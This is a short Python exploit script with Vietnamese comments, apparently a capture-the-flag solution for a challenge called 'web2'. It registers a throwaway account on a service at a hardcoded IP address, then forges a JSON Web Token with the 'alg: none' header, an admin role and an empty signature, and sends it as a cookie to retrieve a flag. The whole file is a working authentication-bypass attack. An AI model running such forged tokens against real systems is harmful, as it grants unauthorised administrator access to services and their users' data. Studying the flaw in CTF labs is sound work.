#!/usr/bin/env python3
# web2 — JWT "alg: none" bypass để lên role admin.
import base64, json, urllib.request, http.cookiejar, random

B = "http://103.116.52.180:45151"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
def call(path, data=None, headers=None):
    r = urllib.request.Request(B + path,
        data=json.dumps(data).encode() if data else None,
        headers={"Content-Type": "application/json", **(headers or {})})
    return op.open(r, timeout=15)

def b64(o):  # base64url không padding
    return base64.urlsafe_b64encode(json.dumps(o, separators=(",", ":")).encode()).rstrip(b"=").decode()

# 1) Đăng ký + đăng nhập để biết cấu trúc payload
u = "u%d" % random.randint(1000, 99999)
call("/register", {"username": u, "password": "secret123"})
call("/login", {"username": u, "password": "secret123"})

# 2) Rèn token alg=none, role=admin, chữ ký rỗng
forged = b64({"alg": "none", "typ": "JWT"}) + "." + \
         b64({"id": 1, "username": u, "role": "admin", "iat": 1789993909, "exp": 1790598709}) + "."

# 3) Gửi qua cookie `token`
req = urllib.request.Request(B + "/flag", headers={"Cookie": "token=" + forged})
print(urllib.request.urlopen(req, timeout=15).read().decode())
